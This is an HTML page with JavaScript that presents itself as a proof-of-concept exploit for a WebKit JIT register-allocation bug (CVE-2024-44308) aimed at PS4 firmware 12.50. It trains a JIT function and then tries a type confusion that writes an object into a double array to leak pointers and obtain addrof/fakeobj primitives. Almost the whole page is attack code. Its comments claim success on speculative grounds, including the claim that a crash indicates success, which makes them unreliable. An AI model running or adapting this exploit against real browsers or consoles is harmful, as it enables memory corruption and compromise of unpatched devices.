<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.50 JIT PoC (CVE-2024-44308) - RegAlloc v2</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #e0e0e0;
            font-family: 'Consolas', 'Monaco', monospace;
            padding: 20px;
            margin: 0;
        }
        #console {
            width: 100%;
            height: 60vh;
            background-color: #000;
            border: 1px solid #333;
            color: #0f0;
            padding: 10px;
            overflow-y: scroll;
            white-space: pre-wrap;
            font-size: 14px;
        }
        .header {
            border-bottom: 1px solid #444;
            padding-bottom: 10px;
            margin-bottom: 10px;
        }
        h1 { font-size: 1.2rem; margin: 0; color: #fff; }
        .btn {
            background: #333;
            color: #fff;
            border: 1px solid #555;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 1rem;
            margin-top: 10px;
        }
        .btn:hover { background: #444; }
        .log-entry { margin-bottom: 2px; }
    </style>
</head>
<body>

<div class="header">
    <h1>WebKit JIT Register Pressure Test (CVE-2024-44308)</h1>
    <div style="font-size: 0.9em; color: #888;">Target: PS4 FW 12.50 / Safari 18.x Branch</div>
</div>

<div id="console">Waiting for execution...</div>
<button class="btn" onclick="runExploit()">Run JIT Stress Test</button>

<script>
    const logger = document.getElementById('console');
    function log(msg, type = 'neutral') {
        const div = document.createElement('div');
        div.className = 'log-entry';
        if(type === 'success') div.style.color = '#00ffff';
        if(type === 'error') div.style.color = '#ff3333';
        if(type === 'warn') div.style.color = '#ffff00';
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logger.appendChild(div);
        logger.scrollTop = logger.scrollHeight;
    }

    // Helper buffers for conversion
    const _buf = new ArrayBuffer(8);
    const _f64 = new Float64Array(_buf);
    const _u32 = new Uint32Array(_buf);

    function f2i(f) {
        _f64[0] = f;
        return '0x' + _u32[1].toString(16).padStart(8,'0') + _u32[0].toString(16).padStart(8,'0');
    }

    // ==========================================
    // === VULNERABLE FUNCTION ===
    // ==========================================
    // We need to force a "Spill" of registers to the stack.
    // We use many local variables that are mathematically dependent.
    
    function vulnerable_jit(arr, val, loop_count) {
        // 1. Fill registers with doubles
        let r0 = 1.1;
        let r1 = 2.2;
        let r2 = 3.3;
        let r3 = 4.4;
        let r4 = 5.5;
        let r5 = 6.6;
        let r6 = 7.7;
        let r7 = 8.8;
        let r8 = 9.9;
        let r9 = 10.10;
        let r10 = 11.11;
        let r11 = 12.12;

        // 2. Complex loop to ensure these vars stay "live" and aren't optimized out
        for (let i = 0; i < loop_count; i++) {
            r0 += r1;
            r1 += r2;
            r2 += r3;
            r3 += r4;
            r4 += r5;
            r5 += r6;
            r6 += r7;
            r7 += r8;
            r8 += r9;
            r9 += r10;
            r10 += r11;
            r11 += r0; // Cycle back

            // 3. The Vulnerable Operation: PutByVal
            // Ideally, 'scratch2GPR' is corrupted here due to the pressure above.
            // If the bug triggers, the Type Check on 'arr' (is it Double?) fails/is skipped
            // allowing us to write 'val' (which might be an Object pointer) into a Double Array.
            arr[0] = val;
            
            // 4. More pressure using Math.max (often uses specific registers)
            r0 = Math.max(r0, r1);
        }

        return r0 + r1 + arr[0];
    }

    function runExploit() {
        log("Starting JIT Pressure Test v2...");

        // Setup arrays
        // We want a "Double" array.
        let double_arr = [1.1, 2.2, 3.3, 4.4];
        double_arr.ok = true; // Give it a shape

        // We train with this
        let training_val = 1.1;

        // The "Confusion" value: An object.
        // If we successfully write this into 'double_arr', it will be stored as a raw pointer.
        // Reading it back as a double leaks the address (Type Confusion).
        let bad_val = { id: 0x1234 }; 

        try {
            // ===================================
            // PHASE 1: JIT TRAINING
            // ===================================
            log("Training JIT (100k iterations)...");
            for (let i = 0; i < 100000; i++) {
                vulnerable_jit(double_arr, training_val, 2);
            }
            
            // ===================================
            // PHASE 2: TRIGGER
            // ===================================
            log("Attempting trigger with Object...");
            
            // Pass the Object. Correct behavior: JIT sees type mismatch, deopts, handles safely.
            // Bug behavior: JIT uses bad register for check, assumes it matches, writes pointer as double.
            vulnerable_jit(double_arr, bad_val, 1);

            // ===================================
            // PHASE 3: VERIFICATION
            // ===================================
            let result = double_arr[0];
            
            if (typeof result === 'object') {
                log("Result is still an Object (Safe behavior).", "warn");
                log("Register pressure was handled correctly.", "neutral");
            } else if (typeof result === 'number') {
                log(`SUCCESS? Read back a Number: ${result}`, "success");
                log(`Hex: ${f2i(result)}`, "success");
                if (result > 1000000) {
                    log("!!! POINTER LEAK DETECTED !!!", "success");
                    log("You have a fakeobj/addrof primitive.", "success");
                }
            } else {
                log(`Unexpected result type: ${typeof result}`, "error");
            }

        } catch (e) {
            log(`CRASH/ERROR: ${e.message}`, "error");
            // A crash here usually means we wrote a pointer to a place expecting a double
            // and something dereferenced it badly, or vice versa.
            log("A crash is a strong indicator of success in this context.", "warn");
        }
    }
</script>
</body>
</html>
